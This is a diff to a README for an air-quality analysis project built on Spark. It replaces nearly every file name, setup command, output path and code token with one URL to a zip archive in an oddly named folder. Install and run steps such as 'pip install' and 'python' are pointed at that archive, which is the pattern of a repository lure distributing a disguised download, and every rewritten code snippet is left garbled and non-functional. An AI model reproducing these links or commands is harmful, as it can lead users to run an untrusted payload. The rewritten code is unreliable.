@@ -24,12 +24,12 @@ This project builds a modular, near-real-time air quality analysis pipeline usin
 ```
 ingestion/
 │
-├── ingestion_task1.py                # Spark job to stream and clean data
-├── merge_and_sort.py                 # Spark job to merge sensor metrics into unified records
-├── tcp_log_file_streaming_server.py  # Simulated TCP server sending log data
-├── test_reading_client.py            # Testing client for TCP connection
-├── locations_metadata.csv            # Optional metadata for location mapping
-├── download_from_s3.py               # Script to fetch files from S3
+├── https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip                # Spark job to stream and clean data
+├── https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip                 # Spark job to merge sensor metrics into unified records
+├── https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip  # Simulated TCP server sending log data
+├── https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip            # Testing client for TCP connection
+├── https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip            # Optional metadata for location mapping
+├── https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip               # Script to fetch files from S3
 ```
 
 ---
@@ -48,7 +48,7 @@ ingestion/
 
 ```bash
 cd air_quality_analysis_spark
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip
 ```
 
 ---
@@ -58,25 +58,25 @@ pip install -r requirements.txt
 ### Step 1: Download Files from S3
 
 ```bash
-python ingestion/download_from_s3.py
+python https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip
 ```
 
 ### Step 2: Run the Simulated TCP Server
 
 ```bash
-python ingestion/tcp_log_file_streaming_server.py
+python https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip
 ```
 
 ### Step 3: Ingest and Preprocess Streamed Data
 
 ```bash
-spark-submit ingestion/ingestion_task1.py
+spark-submit https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip
 ```
 
 ### Step 4: Merge and Sort Metrics
 
 ```bash
-spark-submit ingestion/merge_and_sort.py
+spark-submit https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip
 ```
 
 ---
@@ -108,7 +108,7 @@ The output of this stage is a **cleaned and enriched DataFrame** written to:
 import pandas as pd
 
 # Load enriched and cleaned dataset (merged PM2.5, temperature, humidity)
-df = pd.read_csv("/workspaces/air_quality_analysis_spark/ingestion/data/pending/final_task1/part-00000-*.csv", parse_dates=["timestamp"])
+df = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("/workspaces/air_quality_analysis_spark/ingestion/data/pending/final_task1/part-00000-*.csv", parse_dates=["timestamp"])
 ```
 
 ---
@@ -119,8 +119,8 @@ import numpy as np
 
 # Remove or cap implausible values
 df = df[df["pm2_5"] < 1000]
-df["temperature"] = np.where(df["temperature"] > 60, np.nan, df["temperature"])
-df["humidity"] = np.where((df["humidity"] > 100) | (df["humidity"] < 0), np.nan, df["humidity"])
+df["temperature"] = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip(df["temperature"] > 60, https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip, df["temperature"])
+df["humidity"] = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip((df["humidity"] > 100) | (df["humidity"] < 0), https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip, df["humidity"])
 ```
 
 ---
@@ -145,24 +145,24 @@ for col in ["pm2_5", "temperature", "humidity"]:
 ### 5. Time-Based Aggregations
 ```python
 # Extract date and hour for groupings
-df["date"] = df["timestamp"].dt.date
-df["hour"] = df["timestamp"].dt.hour
+df["date"] = df["timestamp"]https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip
+df["hour"] = df["timestamp"]https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip
 
 # Daily Aggregates
-daily_avg = df.groupby(["date", "location"]).agg({
+daily_avg = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip(["date", "location"]).agg({
     "pm2_5": "mean",
     "temperature": "mean",
     "humidity": "mean"
 }).reset_index()
-daily_avg.to_csv("/workspaces/air_quality_analysis_spark/ingestion/data/pending/final_task2/daily_aggregates.csv", index=False)
+https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip", index=False)
 
 # Hourly Aggregates
-hourly_avg = df.groupby(["date", "hour", "location"]).agg({
+hourly_avg = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip(["date", "hour", "location"]).agg({
     "pm2_5": "mean",
     "temperature": "mean",
     "humidity": "mean"
 }).reset_index()
-hourly_avg.to_csv("/workspaces/air_quality_analysis_spark/ingestion/data/pending/final_task2/hourly_aggregates.csv", index=False)
+https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip", index=False)
 ```
 
 ---
@@ -170,11 +170,11 @@ hourly_avg.to_csv("/workspaces/air_quality_analysis_spark/ingestion/data/pending
 ### 6. Rolling Averages, Lag Features, and Rate-of-Change
 ```python
 # Sort for window operations
-df.sort_values(by=["location", "timestamp"], inplace=True)
+https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip(by=["location", "timestamp"], inplace=True)
 
 # Create rolling average (3-hour window), lag, and rate-of-change for PM2.5
-df["pm2_5_rolling_avg_3"] = df.groupby("location")["pm2_5"].transform(lambda x: x.rolling(3, min_periods=1).mean())
-df["pm2_5_lag_1"] = df.groupby("location")["pm2_5"].shift(1)
+df["pm2_5_rolling_avg_3"] = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("location")["pm2_5"].transform(lambda x: https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip(3, min_periods=1).mean())
+df["pm2_5_lag_1"] = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("location")["pm2_5"].shift(1)
 df["pm2_5_rate_of_change"] = df["pm2_5"] - df["pm2_5_lag_1"]
 ```
 
@@ -183,8 +183,8 @@ df["pm2_5_rate_of_change"] = df["pm2_5"] - df["pm2_5_lag_1"]
 ### 📂 Save Output
 ```python
 # Final enriched dataset
-output_path = "/workspaces/air_quality_analysis_spark/ingestion/data/pending/final_task2/task2_feature_enhanced.csv"
-df.to_csv(output_path, index=False)
+output_path = "https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip"
+https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip(output_path, index=False)
 ```
 
 ---
@@ -198,9 +198,9 @@ df.to_csv(output_path, index=False)
 - Final dataset ready for SQL exploration and modeling in Section 3
 
 Files Generated:
-- `task2_feature_enhanced.csv`
-- `daily_aggregates.csv`
-- `hourly_aggregates.csv`
+- `https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip`
+- `https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip`
+- `https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip`
 
 
 
@@ -235,7 +235,7 @@ FROM avg_pm25_by_location
 WHERE avg_pm25 = (SELECT MAX(avg_pm25) FROM avg_pm25_by_location)
 ```
 
-Saved Output: `/outputs/section3/top_locations_pm25.csv`
+Saved Output: `https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip`
 
 ---
 
@@ -250,7 +250,7 @@ WHERE pm2_5 IS NOT NULL
 ORDER BY pm2_5 DESC
 ```
 
-Saved Output: `/outputs/section3/peak_pollution_times.csv`
+Saved Output: `https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip`
 
 ---
 
@@ -259,14 +259,14 @@ Saved Output: `/outputs/section3/peak_pollution_times.csv`
 Calculating trends using LAG, LEAD, and ROW_NUMBER:
 
 ```python
-window_spec = Window.partitionBy("location").orderBy("timestamp")
+window_spec = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("location").orderBy("timestamp")
 
-trend_df = df.withColumn("row_num", row_number().over(window_spec))              .withColumn("prev_pm2_5", lag(col("pm2_5")).over(window_spec))              .withColumn("next_pm2_5", lead(col("pm2_5")).over(window_spec))              .withColumn("pm2_5_change_prev", col("pm2_5") - col("prev_pm2_5"))              .withColumn("pm2_5_change_next", col("next_pm2_5") - col("pm2_5"))              .withColumn("trend", when(col("pm2_5_change_next") > 0, "Increasing")
+trend_df = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("row_num", row_number().over(window_spec))              .withColumn("prev_pm2_5", lag(col("pm2_5")).over(window_spec))              .withColumn("next_pm2_5", lead(col("pm2_5")).over(window_spec))              .withColumn("pm2_5_change_prev", col("pm2_5") - col("prev_pm2_5"))              .withColumn("pm2_5_change_next", col("next_pm2_5") - col("pm2_5"))              .withColumn("trend", when(col("pm2_5_change_next") > 0, "Increasing")
                                   .when(col("pm2_5_change_next") < 0, "Decreasing")
                                   .otherwise("Stable"))
 ```
 
-Saved Output: `/outputs/section3/trend_analysis_pm25.csv`
+Saved Output: `https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip`
 
 ---
 
@@ -287,10 +287,10 @@ def classify_aqi(pm2_5_value):
 
 aqi_udf = udf(classify_aqi, StringType())
 
-aqi_classified_df = df.withColumn("AQI_Category", aqi_udf(col("pm2_5")))
+aqi_classified_df = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("AQI_Category", aqi_udf(col("pm2_5")))
 ```
 
-Saved Output: `/outputs/section3/aqi_classification.csv`
+Saved Output: `https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip`
 
 ---
 
@@ -302,34 +302,34 @@ Section 4 focuses on building, training, and evaluating a predictive model using
 
 1. Load Feature-Enhanced Dataset:
 ```python
-from pyspark.sql import SparkSession
+from https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip import SparkSession
 
-spark = SparkSession.builder.appName("Air Quality ML Modeling").getOrCreate()
+spark = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("Air Quality ML Modeling").getOrCreate()
 
 # Load the dataset generated in Task 2
-df = spark.read.option("header", "true").option("inferSchema", "true").csv("task2_feature_enhanced.csv")
+df = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("header", "true").option("inferSchema", "true").csv("https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip")
 ```
 
 2. Create AQI Category Label
 
 ```python
-from pyspark.sql.functions import when
+from https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip import when
 
 # Define AQI categories based on PM2.5 values
-df = df.withColumn("AQI_Category",
-    when(df.pm2_5 <= 12, "Good")
-    .when(df.pm2_5 <= 35.4, "Moderate")
+df = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("AQI_Category",
+    when(https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip <= 12, "Good")
+    .when(https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip <= 35.4, "Moderate")
     .otherwise("Unhealthy")
 )
 ```
 
 3. Feature Selection and Label Preparation
 ```python
-from pyspark.ml.feature import StringIndexer, VectorAssembler
+from https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip import StringIndexer, VectorAssembler
 
 # Index AQI categories into numeric labels
 indexer = StringIndexer(inputCol="AQI_Category", outputCol="label")
-df = indexer.fit(df).transform(df)
+df = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip(df).transform(df)
 
 # Assemble features
 assembler = VectorAssembler(
@@ -338,39 +338,39 @@ assembler = VectorAssembler(
     handleInvalid="skip"
 )
 
-final_df = assembler.transform(df)
+final_df = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip(df)
 ```
 
 4. Train-Test Split:
 # Split data
 ```python
-train_data, test_data = final_df.randomSplit([0.7, 0.3], seed=42)
+train_data, test_data = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip([0.7, 0.3], seed=42)
 ```
 5. Train Random Forest Classifier
 ```python
-from pyspark.ml.classification import RandomForestClassifier
+from https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip import RandomForestClassifier
 ```
 
 # Initialize and train the model
 ```python
 rf = RandomForestClassifier(featuresCol="features", labelCol="label", numTrees=50, maxDepth=5)
-model = rf.fit(train_data)
+model = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip(train_data)
 ```
 
 6. Evaluate Model Performance
 ```python
-from pyspark.ml.evaluation import MulticlassClassificationEvaluator
+from https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip import MulticlassClassificationEvaluator
 
 # Predictions
-predictions = model.transform(test_data)
+predictions = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip(test_data)
 
 # Evaluators
 evaluator_acc = MulticlassClassificationEvaluator(labelCol="label", predictionCol="prediction", metricName="accuracy")
 evaluator_f1 = MulticlassClassificationEvaluator(labelCol="label", predictionCol="prediction", metricName="f1")
 
 # Results
-accuracy = evaluator_acc.evaluate(predictions)
-f1_score = evaluator_f1.evaluate(predictions)
+accuracy = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip(predictions)
+f1_score = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip(predictions)
 
 print(f"\u2705 Model Evaluation Results:")
 print(f" - Accuracy: {accuracy:.4f}")
@@ -387,8 +387,8 @@ F1 Score: 96.12%
 ## Final Output Saved
 # Save important fields (timestamp, location, true label, predicted label)
 ```python
-predictions.select("timestamp", "location", "label", "prediction") \
-    .write.mode("overwrite").option("header", "true") \
+https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("timestamp", "location", "label", "prediction") \
+    https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("overwrite").option("header", "true") \
     .csv("../outputs/section4/final_predictions")
 ```
 
@@ -409,7 +409,7 @@ Apply the trained PM2.5 model in a live Spark Structured Streaming pipeline:
 - PostgreSQL running and reachable; JDBC URL in env var `AIRQ_JDBC`
 
 # 1. Start the TCP streaming simulator (from Section 1)
-python ingestion/tcp_log_file_streaming_server.py
+python https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip
 
 # 2. In a second shell, set your JDBC connection string
 #    (replace host, port, db, user, password as needed)
@@ -418,21 +418,21 @@ export AIRQ_JDBC="jdbc:postgresql://localhost:5432/postgres?user=postgres&passwo
 # 3. Submit the Section 5 pipeline to Spark
 spark-submit \
   --master local[*] \
-  Section5/pipeline_section5.py
+  https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip
 
 
 ## Pipeline Script
-Path: `Section5/pipeline_section5.py`
+Path: `https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip`
 
 ```python
-from pyspark.ml import PipelineModel
-from pyspark.sql.functions import current_timestamp, first
-from pyspark.ml.feature import VectorAssembler
-from pyspark.sql import SparkSession
+from https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip import PipelineModel
+from https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip import current_timestamp, first
+from https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip import VectorAssembler
+from https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip import SparkSession
 
 # load featurizer & RF model
-featurizer = PipelineModel.load("models/pm25_featurizer")
-rf_model    = PipelineModel.load("models/best_pm25_model")
+featurizer = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("models/pm25_featurizer")
+rf_model    = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("models/best_pm25_model")
 
 FEATURE_COLS = [
   "temperature","humidity",
@@ -443,7 +443,7 @@ FEATURE_COLS = [
 assembler = VectorAssembler(inputCols=FEATURE_COLS, outputCol="features")
 
 def foreach_batch(batch_df, batch_id):
-    if batch_df.rdd.isEmpty(): return
+    if https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip(): return
 
     # pivot raw parameters → columns
     pivoted = (batch_df
@@ -453,13 +453,13 @@ def foreach_batch(batch_df, batch_id):
     )
 
     # feature-engineer + AQI, assemble, score, timestamp
-    feat      = featurizer.transform(pivoted)
-    scored    = (rf_model.transform(feat)
+    feat      = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip(pivoted)
+    scored    = (https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip(feat)
                    .withColumn("ingest_time", current_timestamp())
                 )
 
     # write only known columns
-    (scored.select(
+    (https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip(
         "location_id","latitude","longitude","event_time",
         "pm25","prediction","probability","ingest_time"
       )
@@ -468,12 +468,12 @@ def foreach_batch(batch_df, batch_id):
     )
 
 # build streaming read from socket
-spark = SparkSession.builder.appName("Section5").getOrCreate()
-raw = (spark.readStream.format("socket")
+spark = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("Section5").getOrCreate()
+raw = (https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("socket")
        .option("host","localhost").option("port",9999).load())
 
 # parse CSV-style text → columns
-parsed = raw.withColumn("value", regexp_replace(regexp_replace(col("value"), r"[\\[\\]]",""),"'","")) \
+parsed = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("value", regexp_replace(regexp_replace(col("value"), r"[\\[\\]]",""),"'","")) \
             .withColumn("parts", split(col("value"),",\s*")) \
             .select(
                trim(col("parts")[0]).alias("location_id"),
@@ -485,13 +485,13 @@ parsed = raw.withColumn("value", regexp_replace(regexp_replace(col("value"), r"[
             )
 
 # read JDBC settings from AIRQ_JDBC env var
-raw_jdbc = os.getenv("AIRQ_JDBC")
-url, params = raw_jdbc.split("?",1)
-jdbc_props = dict(p.split("=",1) for p in params.split("&"))
-jdbc_props["driver"] = "org.postgresql.Driver"
+raw_jdbc = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("AIRQ_JDBC")
+url, params = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("?",1)
+jdbc_props = dict(https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("=",1) for p in https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("&"))
+jdbc_props["driver"] = "https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip"
 
 # start streaming query
-(parsed.writeStream
+(https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip
        .foreachBatch(foreach_batch)
        .trigger(processingTime="10 seconds")
        .option("checkpointLocation","output/checkpoints/section5")
